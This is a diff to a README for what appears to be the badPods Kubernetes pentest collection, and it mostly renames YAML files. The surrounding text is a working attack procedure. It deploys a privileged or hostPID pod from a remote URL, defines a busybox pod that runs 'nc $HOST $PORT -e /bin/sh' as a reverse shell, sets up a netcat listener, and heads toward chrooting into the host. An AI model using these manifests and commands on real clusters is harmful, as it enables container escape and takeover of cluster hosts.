@@ -26,21 +26,21 @@ spec:
   #nodeName: k8s-control-plane-node
   restartPolicy: Always
   ```
-[pod-priv-only.yaml](pod-priv-only.yaml)
+[pod-priv.yaml](pod-priv.yaml)
 
 #### Option 1: Create pod from local yaml 
 ```bash
-kubectl apply -f pod-hostpid-only.yaml   
+kubectl apply -f pod-hostpid.yaml   
 ```
 
 #### Option 2: Create pod from github hosted yaml
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpid-only/pod-hostpid-only.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpid/pod-hostpid.yaml  
 ```
 
 ### Exec into pod 
 ```bash
-kubectl -n [namespace] exec -it pod-hostpid-only -- bash
+kubectl -n [namespace] exec -it pod-hostpid -- bash
 ```
 
 ## Or, create a reverse shell pod
@@ -48,12 +48,12 @@ kubectl -n [namespace] exec -it pod-hostpid-only -- bash
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-priv-only-revshell
+  name: pod-priv-revshell
   labels: 
     app: pentest
 spec:
   containers:
-  - name: priv-only-revshell
+  - name: priv-revshell
     image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
@@ -62,7 +62,7 @@ spec:
   # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
   #nodeName: k8s-control-plane-node
 ```
-[pod-hostpid-only-revshell.yaml](pod-hostpid-only-revshell.yaml)
+[pod-hostpid-revshell.yaml](pod-hostpid-revshell.yaml)
 
 #### Set up listener
 ```bash
@@ -73,7 +73,7 @@ nc -nvlp 3116
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
 HOST="10.0.0.1" PORT="3116" 
-envsubst < ./yaml/hostpid-only/pod-hostpid-only-revshell.yaml | kubectl apply -f -
+envsubst < ./yaml/hostpid/pod-hostpid-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
